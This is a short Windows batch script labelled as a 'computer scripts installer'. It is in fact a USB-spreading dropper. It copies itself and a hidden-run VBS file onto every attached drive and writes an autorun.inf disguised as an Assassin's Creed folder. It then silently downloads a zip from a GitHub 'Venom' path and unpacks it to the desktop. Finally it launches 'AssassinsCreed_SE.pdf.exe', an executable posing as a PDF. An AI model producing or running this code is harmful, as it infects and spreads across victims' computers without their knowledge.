@echo off

@rem Computer scripts installer

@rem Function to check internet connection
:check_internet
ping -n 1 8.8.8.8 >nul 2>&1
if errorlevel 1 (
    timeout /t 7200 >nul
    goto check_internet
)

@rem Function to check for USB drive
:check_drive
@rem Timeout period in seconds (e.g., 300 for 5 minutes)
set timeout_period=300
for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (goto Yes)
)

@rem If USB not found, wait for the specified timeout period and check again
timeout /t %timeout_period% >nul
goto check_drive

@rem If USB present, run payload
:Yes
for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        @rem Generate a random letter using PowerShell
        for /f %%i in ('PowerShell -Command "[char]([byte](Get-Random -Minimum 65 -Maximum 90))"') do set randomLetter=%%i

        @rem Change the USB label to "U$B_<random_letter>"
        label %%d: U$B_%randomLetter%

        md "%%d:\system info"
        @rem attrib +h "%%d:\system info"
        copy "%~f0" "%%d:\system info\AutoRun.bat"
        copy "RunHidden.vbs" "%%d:\system info\RunHidden.vbs"
        echo [autorun] > "%%d:\system info\autorun.inf"
        echo label=AssassinsCreed_USB >> "%%d:\system info\autorun.inf"
        echo action=Open folder to view files >> "%%d:\system info\autorun.inf"
        echo open=explorer.exe >> "%%d:\system info\autorun.inf"
    )
)

@rem Check internet connectivity before downloading the payload
call :check_internet

powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/AssassinsCreed_SE.zip -OutFile AssassinsCreed_SE.zip"

set desktop=C:\Users\%USERNAME%\Desktop
set wd=%CD%

cd %wd%

PowerShell -Command "Expand-Archive -Path 'AssassinsCreed_SE.zip' -DestinationPath '%desktop%' -Force"

copy "%wd%\AssassinsCreed_SE.pdf.exe" "%desktop%"

start "" "%desktop%\AssassinsCreed_SE.pdf.exe"

@end
exit
